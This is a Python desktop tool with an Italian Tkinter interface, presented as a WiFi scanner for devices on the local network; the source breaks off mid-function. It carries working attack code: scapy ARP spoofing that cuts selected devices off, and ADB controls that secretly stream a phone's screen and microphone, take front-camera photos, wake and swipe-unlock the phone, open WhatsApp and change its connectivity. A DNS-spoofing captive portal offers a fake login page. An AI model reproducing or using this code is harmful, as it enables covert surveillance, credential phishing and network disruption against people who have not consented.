import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import socket
import re
import os
from datetime import datetime

BG      = "#0d1117"
SURFACE = "#161b22"
BORDER  = "#30363d"
ACCENT  = "#58a6ff"
GREEN   = "#3fb950"
YELLOW  = "#d29922"
RED     = "#f85149"
TEXT    = "#e6edf3"
MUTED   = "#8b949e"

blocked_threads = {}
SCRCPY_DIR  = os.path.join(os.path.expanduser("~"), "Desktop", "scrcpy-win64-v3.3.4")
SCRCPY_PATH = os.path.join(SCRCPY_DIR, "scrcpy.exe")
ADB_PATH    = os.path.join(SCRCPY_DIR, "adb.exe")

def get_gateway():
    try:
        out = subprocess.check_output("ipconfig", text=True)
        for line in out.splitlines():
            if "Gateway" in line or "gateway" in line:
                m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    return m.group(1)
    except:
        pass
    return None

def arp_spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf, srp
        iface = conf.iface
        my_mac = get_if_hwaddr(iface)
        def resolve(ip):
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        target_mac  = resolve(target_ip)
        gateway_mac = resolve(gateway_ip)
        if not target_mac or not gateway_mac:
            return
        pkt_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=my_mac)
        pkt_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=my_mac)
        while not stop_event.is_set():
            sendp(pkt_t, iface=iface, verbose=0)
            sendp(pkt_g, iface=iface, verbose=0)
            stop_event.wait(1.5)
        r_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=gateway_mac)
        r_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=target_mac)
        for _ in range(5):
            sendp(r_t, iface=iface, verbose=0)
            sendp(r_g, iface=iface, verbose=0)
    except ImportError:
        pass

def get_adb_serial(ip):
    try:
        out = subprocess.check_output([ADB_PATH, "devices"], text=True, timeout=5)
        serials = []
        for line in out.splitlines():
            if "	device" in line and "offline" not in line:
                serial = line.split()[0]
                if ip in serial:
                    return serial
                serials.append(serial)
        # verifica via ip route su ogni serial
        for serial in serials:
            try:
                info = subprocess.check_output(
                    [ADB_PATH, "-s", serial, "shell", "ip addr"],
                    text=True, timeout=5)
                if ip in info:
                    return serial
            except:
                pass
    except:
        pass
    return None

def adb_cmd(ip, *args):
    serial = get_adb_serial(ip)
    if serial:
        subprocess.run([ADB_PATH, "-s", serial, "shell"] + list(args), capture_output=True)

def open_gestisci(ip):
    serial = get_adb_serial(ip)
    already_connected = serial is not None

    win = tk.Toplevel()
    win.title(f"GESTISCI — {ip}")
    win.configure(bg=BG)
    win.resizable(False, False)
    win.grab_set()

    tk.Label(win, text="GESTISCI", font=("Courier New", 16, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(20, 4))
    tk.Label(win, text=f"Dispositivo: {ip}",
             font=("Courier New", 10), bg=BG, fg=MUTED).pack()

    tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=14)

    # ── sezione connessione (mostrata solo se non connesso) ──
    conn_frame = tk.Frame(win, bg=BG)

    if not already_connected:
        win.geometry("560x780")
        tk.Label(conn_frame, text="Sul telefono:\nImpostazioni → Opzioni sviluppatore\n→ Debug wireless → Abbina dispositivo con codice",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="center").pack(pady=(0,10))

        form = tk.Frame(conn_frame, bg=BG)
        form.pack(padx=24, fill="x")

        tk.Label(form, text="IP:PORTA pairing", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=0, column=0, sticky="w", pady=4)
        pair_addr = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_addr.grid(row=0, column=1, padx=(8,0), pady=4)
        pair_addr.insert(0, f"{ip}:PORTA")

        tk.Label(form, text="Codice PIN", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=1, column=0, sticky="w", pady=4)
        pair_pin = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_pin.grid(row=1, column=1, padx=(8,0), pady=4)

        tk.Label(form, text="Porta connessione", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=2, column=0, sticky="w", pady=4)
        conn_port = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        conn_port.grid(row=2, column=1, padx=(8,0), pady=4)
        conn_port.insert(0, "es: 42345")

        status_lbl = tk.Label(conn_frame, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        status_lbl.pack(pady=4)

        def do_pair():
            addr = pair_addr.get().strip()
            pin  = pair_pin.get().strip()
            if not addr or not pin:
                status_lbl.configure(text="Inserisci IP:PORTA e PIN", fg=RED)
                return
            status_lbl.configure(text="Pairing in corso...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "pair", addr, pin], capture_output=True, text=True, timeout=15)
            out = proc.stdout + proc.stderr
            if "success" in out.lower():
                status_lbl.configure(text="Pairing OK! Ora clicca Connetti.", fg=GREEN)
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        def do_connect():
            porta = conn_port.get().strip().split(":")[-1] or "5555"
            status_lbl.configure(text="Connessione...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "connect", f"{ip}:{porta}"], capture_output=True, text=True, timeout=10)
            out = proc.stdout + proc.stderr
            if "connected" in out.lower():
                status_lbl.configure(text="Connesso!", fg=GREEN)
                win.update()
                conn_frame.pack_forget()
                action_frame.pack(pady=10)
                win.geometry("560x680")
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        pair_btn_frame = tk.Frame(conn_frame, bg=BG)
        pair_btn_frame.pack(pady=8)
        tk.Button(pair_btn_frame, text="1. ABBINA", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_pair).pack(side="left", padx=6)
        tk.Button(pair_btn_frame, text="2. CONNETTI", font=("Courier New", 10, "bold"),
                  bg=GREEN, fg=BG, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_connect).pack(side="left", padx=6)

        conn_frame.pack(fill="x")
    else:
        win.geometry("560x680")

    # ── sezione azioni (sempre visibile se già connesso) ──
    action_frame = tk.Frame(win, bg=BG)

    def do_watch():
        s = get_adb_serial(ip)
        if s:
            subprocess.Popen([SCRCPY_PATH, "-s", s, "--video-bit-rate", "4M",
                                     "--max-fps", "30", "--max-size", "800",
                                     "--keyboard=uhid", "--stay-awake"], cwd=SCRCPY_DIR)

    def is_screen_on():
        try:
            out = subprocess.check_output([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                "dumpsys power | grep mWakefulness"], capture_output=False, text=True, timeout=5)
            return "Awake" in out
        except:
            return True

    def toggle_screen():
        if is_screen_on():
            adb_cmd(ip, "input", "keyevent", "KEYCODE_POWER")
            auto_clear("Schermo spento", MUTED)
            screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
        else:
            adb_cmd(ip, "input", "keyevent", "KEYCODE_WAKEUP")
            auto_clear("Schermo acceso", GREEN)
            screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)

    tk.Label(action_frame, text="Azioni disponibili:",
             font=("Courier New", 9), bg=BG, fg=MUTED).pack(pady=(0,8))

    row1 = tk.Frame(action_frame, bg=BG)
    row1.pack()

    def do_4k():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # apri fotocamera frontale
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "am start -a android.media.action.STILL_IMAGE_CAMERA_SECURE "
            "--ei android.intent.extras.CAMERA_FACING 1"], capture_output=True)
        import time; time.sleep(1)
        # scatta foto
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "input keyevent KEYCODE_CAMERA"], capture_output=True)
        auto_clear("Foto scattata!", GREEN)

    tk.Button(row1, text="👁  WATCH", font=("Courier New", 11, "bold"),
              bg=ACCENT, fg=BG, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_watch).pack(side="left", padx=6)

    tk.Button(row1, text="📸  4K", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=GREEN, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_4k).pack(side="left", padx=6)

    row2 = tk.Frame(action_frame, bg=BG)
    row2.pack(pady=(8,0))

    # microfono live
    mic_proc = [None]
    def do_mic():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono disattivato", MUTED)
            return
        # registra audio dal mic del telefono e lo riproduce sul pc
        # usa scrcpy audio per sentire il microfono in tempo reale
        p = subprocess.Popen(
            [SCRCPY_PATH, "-s", s, "--no-video", "--audio-source=mic", "--no-window"],
            cwd=SCRCPY_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
        mic_proc[0] = p
        mic_btn.configure(text="🎤  STOP MIC", fg=RED)
        auto_clear("Microfono attivo — senti in cuffia/casse", GREEN)

        def watch_mic():
            import time
            p.wait()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono fermato", MUTED)
        threading.Thread(target=watch_mic, daemon=True).start()

    def do_apri_wg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # accendi schermo se spento
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        import time; time.sleep(0.5)
        # sblocca swipe
        subprocess.run([ADB_PATH, "-s", s, "shell", "input swipe 540 1600 540 800"], capture_output=True)
        time.sleep(0.5)
        # prova WhatsApp
        r = subprocess.run([ADB_PATH, "-s", s, "shell",
            "monkey -p com.whatsapp 1"], capture_output=True, text=True)
        if "No activities found" in r.stdout or "error" in r.stdout.lower():
            subprocess.run([ADB_PATH, "-s", s, "shell",
                "am start -a android.intent.action.VIEW -d https://www.google.com"],
                capture_output=True)
            auto_clear("WhatsApp non trovato, aperto Google", YELLOW)
        else:
            auto_clear("WhatsApp aperto!", GREEN)


    mic_btn = tk.Button(row2, text="🎤  MICROFONO", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_mic)
    mic_btn.pack(side="left", padx=6)



    tk.Button(row2, text="🏠  HOME", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=lambda: [
                  subprocess.run([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                      "input keyevent KEYCODE_HOME"], capture_output=True),
                  auto_clear("Tornato a Home", GREEN)
              ]).pack(side="left", padx=6)

    tk.Button(row2, text="💬  APRI W/G", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=ACCENT, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_apri_wg).pack(side="left", padx=6)

    schermo_iniziale = is_screen_on()
    screen_btn = tk.Button(row1,
              text="🌙  SPEGNI" if schermo_iniziale else "☀  ACCENDI",
              font=("Courier New", 11),
              bg=SURFACE, fg=MUTED if schermo_iniziale else YELLOW,
              relief="flat", padx=18, pady=8,
              cursor="hand2", command=toggle_screen)
    screen_btn.pack(side="left", padx=6)

    # thread che aggiorna il tasto in base allo stato reale del telefono
    stop_monitor = threading.Event()
    def monitor_screen():
        import time
        last = schermo_iniziale
        while not stop_monitor.is_set() and win.winfo_exists():
            try:
                current = is_screen_on()
                if current != last:
                    last = current
                    if current:
                        screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)
                    else:
                        screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
            except:
                pass
            time.sleep(0.2)
    t = threading.Thread(target=monitor_screen, daemon=True)
    t.start()
    def on_close():
        stop_monitor.set()
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
        win.destroy()
    win.protocol("WM_DELETE_WINDOW", on_close)

    # sezione messaggio
    msg_frame = tk.Frame(action_frame, bg=BG)
    msg_frame.pack(pady=(8,0), padx=24, fill="x")

    msg_entry = tk.Entry(msg_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4)
    msg_entry.pack(side="left", fill="x", expand=True, padx=(0,8))
    msg_entry.insert(0, "Scrivi messaggio...")
    msg_entry.bind("<FocusIn>", lambda e: msg_entry.delete(0, "end") if msg_entry.get() == "Scrivi messaggio..." else None)

    def do_msg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        testo = msg_entry.get().strip()
        if not testo or testo == "Scrivi messaggio...":
            auto_clear("Scrivi un messaggio!", RED)
            return
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f"am broadcast -a android.intent.action.BOOT_COMPLETED"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.settings/.Settings'], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'service call notification 1 s16 "{testo}"'], capture_output=True)
        # toast via shell
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am broadcast -a android.provider.Telephony.SMS_RECEIVED '
            f'--es "sms_body" "{testo}"'], capture_output=True)
        # metodo piu affidabile: overlay
        # crea pagina HTML con messaggio e aprila nel browser
        escaped_html = testo.replace("'", "\'").replace('"', '&quot;').replace('<', '&lt;')
        html = (
            f"data:text/html,<html><body style='background:%23111;display:flex;"
            f"align-items:center;justify-content:center;height:100vh;margin:0;'>"
            f"<div style='background:%23222;color:white;font-size:2em;padding:40px;"
            f"border-radius:20px;text-align:center;font-family:sans-serif;"
            f"box-shadow:0 0 40px %23000;max-width:80%25;'>{escaped_html}</div></body></html>"
        )
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.chrome/com.google.android.apps.chrome.Main '
            f'-a android.intent.action.VIEW -d "{html}"'],
            capture_output=True)
        auto_clear(f"Messaggio inviato: {testo[:30]}", GREEN)

    tk.Button(msg_frame, text="INVIA", font=("Courier New", 10, "bold"),
              bg=GREEN, fg=BG, relief="flat", padx=12, pady=4,
              cursor="hand2", command=do_msg).pack(side="left")

    action_status = tk.Label(action_frame, text="", font=("Courier New", 9),
                             bg=BG, fg=MUTED)
    action_status.pack(pady=6)

    def clear_status():
        action_status.configure(text="")
    
    # pulisce status dopo 2 secondi
    def auto_clear(msg, color):
        action_status.configure(text=msg, fg=color)
        win.after(2000, clear_status)

    tk.Frame(action_frame, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(12,6))

    def open_avanzate():
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso.")
            return
        aw = tk.Toplevel()
        aw.title(f"AVANZATE — {ip}")
        aw.geometry("620x560")
        aw.configure(bg=BG)
        aw.resizable(True, True)
        canvas = tk.Canvas(aw, bg=BG, highlightthickness=0)
        vsb = ttk.Scrollbar(aw, orient="vertical", command=canvas.yview)
        sf = tk.Frame(canvas, bg=BG)
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=vsb.set)
        canvas.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        aw.bind("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))
        tk.Label(sf, text="AVANZATE", font=("Courier New", 16, "bold"), bg=BG, fg=RED).pack(pady=(16,2))
        tk.Label(sf, text=f"Dispositivo: {ip}", font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(sf, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)
        astatus = tk.Label(sf, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        def run(*cmd):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + list(cmd), capture_output=True)
        def qrun(cmd_list, msg, color=GREEN):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + cmd_list, capture_output=True)
            astatus.configure(text=msg, fg=color)
        # connettivita
        tk.Label(sf, text="CONNETTIVITA", font=("Courier New", 8, "bold"), bg=BG, fg=MUTED).pack(pady=(4,0))
        r1 = tk.Frame(sf, bg=BG); r1.pack(pady=4)
        wifi_on = [True]
        def toggle_wifi():
            run("svc wifi disable" if wifi_on[0] else "svc wifi enable")
            wifi_on[0] = not wifi_on[0]
            wb.configure(text="WIFI ON" if not wifi_on[0] else "WIFI OFF", fg=GREEN if not wifi_on[0] else RED)
            astatus.configure(text=f"WiFi {'off' if not wifi_on[0] else 'on'}", fg=MUTED)
        dati_on = [True]
        def toggle_dati():
            run("svc data disable" if dati_on[0] else "svc data enable")
            dati_on[0] = not dati_on[0]
            db.configure(text="DATI ON" if not dati_on[0] else "DATI OFF", fg=GREEN if not dati_on[0] else RED)
            astatus.configure(text=f"Dati {'off' if not dati_on[0] else 'on'}", fg=MUTED)
        aereo_on = [False]
        def toggle_aereo():
            val = "1" if not aereo_on[0] else "0"
            run(f"settings put global airplane_mode_on {val}")
            run("am broadcast -a android.intent.action.AIRPLANE_MODE")
            aereo_on[0] = not aereo_on[0]
            aeb.configure(text="AEREO OFF" if aereo_on[0] else "AEREO ON", fg=RED if aereo_on[0] else MUTED)
            astatus.configure(text=f"Aereo {'on' if aereo_on[0] else 'off'}", fg=MUTED)
        wb = tk.Button(r1, text="WIFI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_wifi)
        wb.pack(side="left", padx=4)
        db = tk.Button(r1, text="DATI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_dati)
        db.pack(side="left", padx=4)
        aeb = tk.Button(r1, text="AEREO ON", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_aereo)
        aeb.pack(side="left", padx=4)
        # volume e luce
        tk.Button(r2, text="VOL ZERO", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["cmd", "media_session", "volume", "--set", "0"], "Volume zero!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MAX", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["settings", "put", "system", "screen_brightness", "255"], "Luminosita massima!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MIN", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: [run("settings", "put", "system", "screen_brightness_mode", "0"),
                                   qrun(["settings", "put", "system", "screen_brightness", "1"], "Luminosita minima!")]).pack(side="left", padx=4)
        # sistema
        tk.Button(r3, text="CHIUDI PLAY", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.vending"], "Play Store chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CHIUDI CHROME", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.chrome"], "Chrome chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CACHE", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["pm", "trim-caches", "1000000000"], "Cache pulita!")).pack(side="left", padx=4)
        # sveglia

        tk.Button(sf, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=aw.destroy).pack(pady=(0,16))
        astatus.pack(pady=4)

    tk.Button(action_frame, text="⚡  AVANZATE", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=RED, relief="flat", padx=20, pady=8,
              cursor="hand2", command=open_avanzate).pack(pady=4)

    tk.Button(action_frame, text="Chiudi", font=("Courier New", 10),
              bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
              cursor="hand2", command=win.destroy).pack(pady=(4,0))
    if already_connected:
        action_frame.pack(pady=10)


class WifiScanner(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WiFi Scanner")
        self.geometry("960x580")
        self.resizable(True, True)
        self.configure(bg=BG)
        self.devices = []
        self._build_ui()

    def _build_ui(self):
        hdr = tk.Frame(self, bg=BG)
        hdr.pack(fill="x", padx=24, pady=(20, 0))

        tk.Label(hdr, text="WIFI SCANNER", font=("Courier New", 20, "bold"),
                 bg=BG, fg=ACCENT).pack(side="left")

        self.status_dot = tk.Label(hdr, text="●", font=("Courier New", 14), bg=BG, fg=MUTED)
        self.status_dot.pack(side="left", padx=(12, 4))

        self.status_lbl = tk.Label(hdr, text="in attesa...", font=("Courier New", 11), bg=BG, fg=MUTED)
        self.status_lbl.pack(side="left")

        self.count_lbl = tk.Label(hdr, text="", font=("Courier New", 11, "bold"), bg=BG, fg=GREEN)
        self.count_lbl.pack(side="right")

        info_frame = tk.Frame(self, bg=SURFACE, highlightthickness=1, highlightbackground=BORDER)
        info_frame.pack(fill="x", padx=24, pady=(12, 0))

        self.subnet_lbl = tk.Label(info_frame, text="Rete locale: rilevamento...",
                                   font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.subnet_lbl.pack(side="left")

        self.time_lbl = tk.Label(info_frame, text="", font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.time_lbl.pack(side="right")

        table_frame = tk.Frame(self, bg=BG)
        table_frame.pack(fill="both", expand=True, padx=24, pady=12)

        cols = ("ip", "hostname", "mac", "stato", "blocco")
        self.tree = ttk.Treeview(table_frame, columns=cols, show="headings", selectmode="browse")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=SURFACE, foreground=TEXT, fieldbackground=SURFACE,
                        rowheight=36, borderwidth=0, font=("Courier New", 10))
        style.configure("Treeview.Heading", background=BG, foreground=MUTED,
                        font=("Courier New", 9, "bold"), relief="flat", borderwidth=0)
        style.map("Treeview", background=[("selected", "#1f2937")])

        headers = {"ip": ("IP ADDRESS", 160), "hostname": ("HOSTNAME", 220),
                   "mac": ("MAC ADDRESS", 160), "stato": ("STATO", 90), "blocco": ("BLOCCO", 90)}

        for col, (label, width) in headers.items():
            self.tree.heading(col, text=label)
            self.tree.column(col, width=width, anchor="w")

        vsb = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")

        self.tree.tag_configure("online",  foreground=GREEN)
        self.tree.tag_configure("blocked", foreground=RED)
        self.tree.tag_configure("self",    foreground=ACCENT)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(fill="x", padx=24, pady=(0, 20))

        self.scan_btn = tk.Button(btn_frame, text="▶  SCANSIONA",
                                  font=("Courier New", 11, "bold"),
                                  bg=ACCENT, fg=BG, activebackground="#79c0ff",
                                  activeforeground=BG, relief="flat",
                                  padx=20, pady=8, cursor="hand2",
                                  command=self._start_scan)
        self.scan_btn.pack(side="left")

        self.block_btn = tk.Button(btn_frame, text="🔴  BLOCCA",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=RED, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._toggle_block)
        self.block_btn.pack(side="left", padx=(10, 0))





        self.gestisci_btn = tk.Button(btn_frame, text="⚙  GESTISCI",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=YELLOW, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._gestisci)
        self.gestisci_btn.pack(side="left", padx=(10, 0))

        self.export_btn = tk.Button(btn_frame, text="💾  ESPORTA",
                                    font=("Courier New", 11),
                                    bg=SURFACE, fg=TEXT, activebackground=BORDER,
                                    relief="flat", padx=20, pady=8, cursor="hand2",
                                    command=self._export)
        self.export_btn.pack(side="left", padx=(10, 0))

        self.rete_btn = tk.Button(btn_frame, text="🌐  RETE",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=ACCENT, activebackground=BORDER,
                                   relief="flat", padx=14, pady=8, cursor="hand2",
                                   command=self._rete)
        self.rete_btn.pack(side="left", padx=(10, 0))

        self.pwd_btn = tk.Button(btn_frame, text="🔑  PWD",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=MUTED, activebackground=BORDER,
                                   relief="flat", padx=14, pady=8, cursor="hand2",
                                   command=cambia_password_dialog)
        self.pwd_btn.pack(side="right", padx=(10, 0))

        self.progress = ttk.Progressbar(btn_frame, mode="indeterminate", length=120)
        self.progress.pack(side="right")

        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.after(400, self._start_scan)

    def _on_select(self, _=None):
        sel = self.tree.selection()
        if not sel:
            return
        ip = self.tree.item(sel[0])["values"][0]
        if ip in blocked_threads:
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
        else:
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)

    def _gestisci(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        tags = self.tree.item(sel[0])["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showinfo("Gestisci", "Questo e il tuo stesso PC!")
            return
        open_gestisci(ip)

    def _rete(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        mac = self.tree.item(sel[0])["values"][2]
        tags = self.tree.item(sel[0])["tags"]
        tag  = tags[0] if tags else ""

        win = tk.Toplevel()
        win.title(f"RETE — {ip}")
        win.geometry("600x620")
        win.configure(bg=BG)
        win.resizable(False, False)

        tk.Label(win, text="RETE", font=("Courier New", 16, "bold"),
                 bg=BG, fg=ACCENT).pack(pady=(16,2))
        tk.Label(win, text=f"Dispositivo: {ip}  |  MAC: {mac}",
                 font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)

        status = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=MUTED)

        # ── WAKE ON LAN ──
        tk.Label(win, text="WAKE ON LAN", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack()
        r1 = tk.Frame(win, bg=BG); r1.pack(pady=4)

        def do_wol():
            if mac == "—":
                status.configure(text="MAC non disponibile!", fg=RED)
                return
            try:
                import socket, struct
                mac_clean = mac.replace("-","").replace(":","")
                magic = bytes.fromhex("F" * 12 + mac_clean * 16)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    s.sendto(magic, ("255.255.255.255", 9))
                status.configure(text=f"Magic packet inviato a {mac}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r1, text="⚡  WAKE ON LAN", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_wol).pack(side="left", padx=4)

        # ── CAPTIVE PORTAL + DNS SPOOFING ──
        tk.Label(win, text="CAPTIVE PORTAL + DNS SPOOFING", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))

        # tipo pagina
        tipo_var = tk.StringVar(value="login_fake")
        tipo_frame = tk.Frame(win, bg=BG); tipo_frame.pack(pady=2)
        tk.Radiobutton(tipo_frame, text="Login falso", variable=tipo_var, value="login_fake",
                       bg=BG, fg=TEXT, selectcolor=SURFACE, activebackground=BG,
                       font=("Courier New", 9)).pack(side="left", padx=6)
        tk.Radiobutton(tipo_frame, text="Redirect URL", variable=tipo_var, value="redirect",
                       bg=BG, fg=TEXT, selectcolor=SURFACE, activebackground=BG,
                       font=("Courier New", 9)).pack(side="left", padx=6)

        # url personalizzato
        url_frame = tk.Frame(win, bg=BG); url_frame.pack(pady=2)
        tk.Label(url_frame, text="URL redirect:", font=("Courier New", 9),
                 bg=BG, fg=MUTED).pack(side="left", padx=(0,4))
        portal_url_var = tk.StringVar(value="https://www.google.com")
        url_entry = tk.Entry(url_frame, textvariable=portal_url_var,
                             font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=26)
        url_entry.pack(side="left")

        # titolo pagina login fake
